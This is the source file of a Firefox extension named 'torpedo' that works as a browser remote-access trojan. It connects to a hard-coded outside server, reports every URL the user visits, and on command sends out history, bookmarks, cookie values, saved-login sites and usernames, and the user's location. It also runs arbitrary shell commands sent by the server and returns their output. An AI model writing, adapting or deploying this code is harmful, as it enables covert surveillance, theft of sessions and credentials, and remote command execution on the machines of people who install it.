// The main module of the torpedo extension.

var server = "http://joshbalfour.co.uk:1337";


require("tabs").on("ready", logURL);
  
var passw = require("passwords");
var request = require("request");
var {Cc, Ci, Cu} = require("chrome");
var io = require("./lib/kieran");

Cu.import("resource://gre/modules/PlacesUtils.jsm");
Cu.import("resource://gre/modules/FileUtils.jsm");

var historyService = Cc["@mozilla.org/browser/nav-history-service;1"].getService(Ci.nsINavHistoryService);
var dirSvc = Cc["@mozilla.org/file/directory_service;1"].getService(Ci.nsIProperties);
var ioService=Cc["@mozilla.org/network/io-service;1"].getService(Ci.nsIIOService);
var scriptableStream=Cc["@mozilla.org/scriptableinputstream;1"].getService(Ci.nsIScriptableInputStream);
var cookieManager = Cc["@mozilla.org/cookiemanager;1"].getService(Ci.nsICookieManager);
var xpcomGeolocation = Cc["@mozilla.org/geolocation;1"].getService(Ci.nsIDOMGeoGeolocation);
var env = Cc["@mozilla.org/process/environment;1"].getService(Ci.nsIEnvironment);
var process = Cc["@mozilla.org/process/util;1"].createInstance(Ci.nsIProcess);



var socket = new io.socket(server, 
function(data){ // function run where data receieved
    console.log("Receieved data: " + JSON.stringify(data)); //stringify and display the data
    
    command = data[0];
    args = data[1];
    
    var toSend=[""];
    exec = true;
    
    switch (command)
    {
        case 0:
            toSend=getHistory();
            break;
        case 1:
            toSend=getBookmarks();
            break;
        case 2:
            toSend=getCookies();
            break;
        case 3:
            show_all_passwords(command);
            break;
        case 4:
            getCurrentPosition(command);
            break;
        case 5:
            runCommand(args);
            break;
        default:
            toSend=[""];
            exec=false;
            break;
            
    }
    
    if (toSend != [""])
    {
        sendDataAsync(command,toSend);
    }
    
    
},function(data){ // function run where connection closed
    console.log("Connection closed"); //Error out
}).connect(function(result){
    console.log(result['message']); //display connection message
});

function sendDataAsync(command,data)
{
    var gonnaSend = new Array(command,data)
    socket.write(gonnaSend);
}

function logURL(tab) {
    var currentTime = new Date();
    var month = currentTime.getMonth() + 1;
    var day = currentTime.getDate();
    var year = currentTime.getFullYear();
    date = month + "/" + day + "/" + year;
    data = new Array(date,tab.url); 
    data2= new Array("h",data);
    socket.write(data2);  
}



function getHistory()
{
   var history = Array();
   

    // queries parameters (e.g. domain name matching, text terms matching, time range...)
    // see : https://developer.mozilla.org/en/nsINavHistoryQuery
    var query = historyService.getNewQuery();
    
    // options parameters (e.g. ordering mode and sorting mode...)
    // see : https://developer.mozilla.org/en/nsINavHistoryQueryOptions
    var options = historyService.getNewQueryOptions();
    
    // execute the query
    // see : https://developer.mozilla.org/en/nsINavHistoryService#executeQuery()
    var result = historyService.executeQuery(query, options);
    
    // Using the results by traversing a container
    // see : https://developer.mozilla.org/en/nsINavHistoryContainerResultNode
    var cont = result.root;
        cont.containerOpen = true;
        
    for (var i = 0; i < cont.childCount; i ++) {
        var node = cont.getChild(i);
        // "node" attributes contains the information (e.g. URI, title, time, icon...)
        // see : https://developer.mozilla.org/en/nsINavHistoryResultNode
       history.push(Array(node.title,node.uri,node.time));
    }
    
    // Close container when done
    // see : https://developer.mozilla.org/en/nsINavHistoryContainerResultNode
    cont.containerOpen = false;
    return history;
    
}

function getBookmarks(){
    
    // Create the backup file
    var jsonFile = dirSvc.get("ProfD", Ci.nsILocalFile);
    var fName = new Date();
    var nameOfFile = fName.getTime()+".json";
    jsonFile.append(nameOfFile);
    jsonFile.create(Ci.nsILocalFile.NORMAL_FILE_TYPE, 0600);
    
    // Export bookmarks in JSON format to file
    PlacesUtils.backupBookmarksToFile(jsonFile);
    var filePath = jsonFile.path;
    var contents = Read(jsonFile);
    return contents;
}

function show_all_passwords() {
allCredentials = Array();
  passw.search({
    onComplete: function onComplete(credentials) {
        credentials.forEach(function(credential) {
            allCredentials.push(Array(credential.url,credential.username)); // add ,credential.password
        });
        sendDataAsync(command,allCredentials);
        return;
      }       
    });
}


function getCookies()
{
    cookies = Array();      
    for (var e = cookieManager.enumerator; e.hasMoreElements();) {
        var cookie = e.getNext().QueryInterface(Ci.nsICookie); 
        cookies.push(Array(cookie.host,cookie.name,cookie.value));
    }
    return cookies;
}

function getCurrentPosition() {
  xpcomGeolocation.getCurrentPosition(function(position) {
        var JSONposition = Array(position.coords.latitude,position.coords.longitude);  
        sendDataAsync(command,JSONposition);
    });  
}


// will return the result of the final command given. Put && instead of returns, otherwise it will probably screw things up.
function runCommand(command){
    // don't ask..... just don't.
    var fName = new Date();
    var file = Cc["@mozilla.org/file/directory_service;1"].
           getService(Ci.nsIProperties).
           get("ProfD", Ci.nsIFile);
    var dir = file.path;
    
    var fileName=fName.getTime()+".command";
    var outputFileName=fName.getTime()+".temp";
    var outputFilePath = dir + "/"+ outputFileName;
    
    file.append(fileName);
    file.create(Ci.nsILocalFile.NORMAL_FILE_TYPE, 0777);

    var foStream = Cc["@mozilla.org/network/file-output-stream;1"]
                             .createInstance(Ci.nsIFileOutputStream);
     
    foStream.init(file, 0x02 | 0x08 | 0x20, 0666, 0); 
    var data = "cd '"+dir+"' && "+command+" >> '"+outputFilePath+"' 2>&1";
    foStream.write(data, data.length);
    foStream.close();
    
    var shell = new FileUtils.File(file.path);
    var args= [];
    process.init(shell);
    process.run(true,args, args.length);
    var outputFile = new FileUtils.File(outputFilePath);
    var stuff = Read(outputFile);
    return stuff;
}



// pass in an nsILocalFile
function Read(file)
{

    var data = "";
    var fstream = Cc["@mozilla.org/network/file-input-stream;1"].
                  createInstance(Ci.nsIFileInputStream);
    var cstream = Cc["@mozilla.org/intl/converter-input-stream;1"].
                  createInstance(Ci.nsIConverterInputStream);
    fstream.init(file, -1, 0, 0);
    cstream.init(fstream, "UTF-8", 0, 0); // you can use another encoding here if you wish
     
    let (str = {}) {
      let read = 0;
      do { 
        read = cstream.readString(0xffffffff, str); // read as much as we can and put it in str.value
        data += str.value;
      } while (read != 0);
    }
    cstream.close(); // this closes fstream
     
    return data;
}

